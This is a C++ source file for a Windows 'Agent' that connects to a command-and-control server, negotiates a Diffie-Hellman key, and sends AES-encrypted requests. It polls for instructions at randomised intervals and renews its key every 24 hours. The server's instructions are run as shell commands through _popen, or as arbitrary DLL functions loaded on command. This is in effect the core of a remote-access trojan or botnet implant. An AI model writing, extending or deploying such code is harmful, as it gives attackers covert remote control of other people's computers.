#include "Agent.h"
// declaration for the delegate
typedef string(*LPGETNUMBER)(string);

/*
	split the command from the server by space
*/
vector<string> split(string str)
{
	istringstream iss(str);
	vector<string> tokens;
	copy(istream_iterator<string>(iss),
		istream_iterator<string>(),
		back_inserter(tokens));

	return tokens;
}
/*
	Agent Construcor
	Creates a socket and new symetric key thats being shared with diffie hellman
	runs thread that renews the shared key every 24 hours
	runs function that gets commands from server between 2 and 3 minutes

*/
Agent::Agent()
{
	recvbuflen = DEFAULT_BUFLEN;

	CreateSocket();
	CreateNewSymetricKey();
	aes = AES_crypto(sharedKey);

	byte key[32];
	/*char * str = (char *)sharedKey.substr(0, 32).c_str();
	for (size_t i = 0; i < 32; i++)
	{
		key[i] = static_cast<unsigned char>(str[i]);
	}*/
	/*memcpy(key, sharedKey.substr(0, 32).data(), 32);
	mbedtls_aes_setkey_enc(&aes, key, 256);*/
	

	thread t1(&Agent::CreateNewSymetricKeyWithThread, this);
	t1.detach();
	thread t2(&Agent::GetRequestFromServer, this);
	t2.detach();
}
/*
	Create socket to CC
*/
void Agent::CreateSocket()
{
	mySocket = Socket(SERVER_ADDRESS, DEFAULT_PORT);
	iResult = mySocket.Get_iResult();
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		exit(1);
	}

	// Resolve the server address and port
	iResult = mySocket.Resolve();
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		exit(1);
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = mySocket.GetResult(); ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		mySocket.CreateSocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (mySocket.GetSocket() == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			mySocket.Cleanup(false);
			exit(1);
		}

		// Connect to server.
		iResult = mySocket.Connect(ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			mySocket.Cleanup(true);
			continue;
		}
		break;
	}

	if (mySocket.GetSocket() == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		mySocket.Cleanup(false);
		exit(1);
	}

	recvbuf[0] = '\0';
}
/*
	Create New Symetric Key from diffie hllmaan shared secret
*/
void Agent::CreateNewSymetricKey()
{
	DiffieHelman dh;

	string p = dh.get_p();
	p.erase(remove(p.begin(), p.end(), '.'), p.end());
	string message = string("1 ").append(p).append(" ").append(to_string(dh.get_g()));	
	SendMessageToServer(message.c_str(), message.length());
	ReciveMessage();
	vector<string> res = split(string(recvbuf));
	vector<string>::iterator it = res.begin();
	if (!strcmp(it->c_str(), "2"))
	{
		++it;
		sharedKey = dh.set_sheard_key(it->c_str());
		sharedKey.erase(remove(sharedKey.begin(), sharedKey.end(), '.'), sharedKey.end());
	}

	//Sleep(10000);
	CreateSocket();
	string pubKey = dh.get_public_key();
	pubKey.erase(remove(pubKey.begin(), pubKey.end(), '.'), pubKey.end());
	message = string("2 ").append(pubKey);
	SendMessageToServer(message.c_str(), message.length());
	ReciveMessage();
}
/*
	renew the key every 24 hours
*/
void Agent::CreateNewSymetricKeyWithThread()
{
	while (true)
	{
		Sleep((size_t)MILLISECONDS);
		CreateNewSymetricKey();
	}
	
}

/*
	Get request from server and execute the command or call a function in components
	Do this every 2-3 minutes
*/
void Agent::GetRequestFromServer()
{
	while (true)
	{
		CreateSocket();
		string message = string("3 ").append(REQUEST_STRING);
	    string m = aes.Encrypt(message);

		//send and receive messages
		SendMessageToServer(m.c_str(), m.size());
		ReciveMessage();

		vector<string> res = split(string(recvbuf));
		vector<string>::iterator it = res.begin();

		// Take action from command
		if (!strcmp(it->c_str(), "3"))
		{
			++it;
			string todo = *it;
			++it;
			if (todo.compare("cmd"))
			{
				string action = *it;
				exec(action);
			}
			else if (todo.compare("func"))
			{
				string library = *it;
				string func = *(++it);
				string cmd = *(++it);
				while (it != res.end())
				{
					cmd.append(*(++it));
				}
				runDynamicFunction(library, func, cmd);
			}
		}
		double r = ((double)rand() / (RAND_MAX)) + 1;

		Sleep(r * 60 * 1000);
	}
}
/*
	Take message and send it to server
*/
void Agent::SendMessageToServer(const char * message, size_t length)
{
	// Send an initial buffer
	iResult = mySocket.SendToServer(message, length);
	if (iResult == SOCKET_ERROR) {
		printf("send failed with error: %d\n", WSAGetLastError());
		mySocket.Cleanup(true);
		return;
	}

	printf("Bytes Sent: %ld\n", iResult);
}

/*
	Receive answer from server by reading constant amount of bytes
*/
void Agent::ReciveMessage()
{
	// Receive until the peer closes the connection
	do {

		iResult = mySocket.ReciveFromServer(recvbuf, recvbuflen);
		if (iResult > 0)
			printf("Bytes received: %d\n", iResult);
		else if (iResult == 0)
			printf("Connection closed\n");
		else
			printf("recv failed with error: %d\n", WSAGetLastError());

	} while (iResult > 0);
}
/*
  // shutdown the connection since no more data will be sent
*/
void Agent::Shutdown()
{
	// shutdown the connection since no more data will be sent
	iResult = mySocket.ShutdownConnection();
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		mySocket.Cleanup(true);
	}
}
// Cleanup
void Agent::Cleanup()
{
	mySocket.Cleanup(true);
}
/*
	run Dynamic Function 
	Input: name of dll, the function, commands to function
	Output: stdout
*/
string Agent::runDynamicFunction(string library, string function, string cmd)
{
	HINSTANCE hinstDLL = LoadLibrary(library.c_str());
	LPGETNUMBER func = (LPGETNUMBER)GetProcAddress(hinstDLL, function.c_str());
	if (func != NULL)
		return func(cmd);
	FreeLibrary(hinstDLL);

	return string();
}

/*
	commands to be executed in command line
	Input: command
	Output: stdout
*/
string Agent::exec(string cmd)
{
	char buffer[128];
	string result = "";
	FILE *pipe = _popen(cmd.c_str(), "r");
	try
	{
		while (!feof(pipe))
		{
			if (fgets(buffer, 128, pipe) != NULL)
			{
				result += buffer;
			}
		}
	}
	catch(...)
	{
		_pclose(pipe);
	}

	_pclose(pipe);
	return result;
}

